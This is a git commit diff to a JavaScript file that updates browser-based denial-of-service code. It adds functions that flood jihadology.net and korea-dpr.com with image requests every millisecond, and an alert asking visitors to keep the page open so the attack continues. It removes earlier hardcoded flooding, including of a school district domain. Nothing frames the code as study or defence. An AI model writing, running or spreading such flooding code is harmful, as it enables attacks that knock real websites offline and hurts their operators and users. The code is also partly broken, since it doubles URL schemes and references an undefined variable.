a9d4f9c60823e098c531496c7a3d683dc6a4a128
ninja25538 <ninja25538@users.noreply.github.com>
2017-05-19 17:06:53 -0400

    Update main.js

--- main.js
+++ main.js
@@ -1,22 +1,25 @@
-function imgflood() {  
-  var TARGET = 'korea-dpr.com';
+alert("Sending an attack =D, so just do what you want but leave this site open or else it'll stop the attack");
+
+function imgflood(link) {  
+  var TARGET = link;
   var URI = '/index.html';
   var pic = new Image();
   var rand = Math.floor(Math.random() * 1000);
   pic.src = 'http:'+TARGET+URI+rand+'=val';
 }
-setInterval(imgflood, 1);
-function FLOOD() {  
-  var TARGET = 'jihadology.net';
-  var URI = '/index.html';
-  var pic = new Image();
-  var rand = Math.floor(Math.random() * 1000);
-  pic.src = 'http:'+TARGET+URI+rand+'=val';
-}
-setInterval(FLOOD, 1);
-var domain = 'ls-child.mvcsc.k12.in.us';
+function DOSATTACK(link){
+var domain = link;
 setInterval(function(){
   var img = document.createElement('img');
   img.setAttribute('src', 'ftp://' + domain + ':80/image' + new Date().getTime() + i );
   document.body.appendChild(img);
+}, 1);  
+}
+
+setInterval(function(){
+  imgflood("http://jihadology.net");
+  imgflood("http://korea-dpr.com");
+  DOSATTACK("http://jihadology.net");
+  DOSATTACK("http://korea-dpr.com");
 }, 1);
+
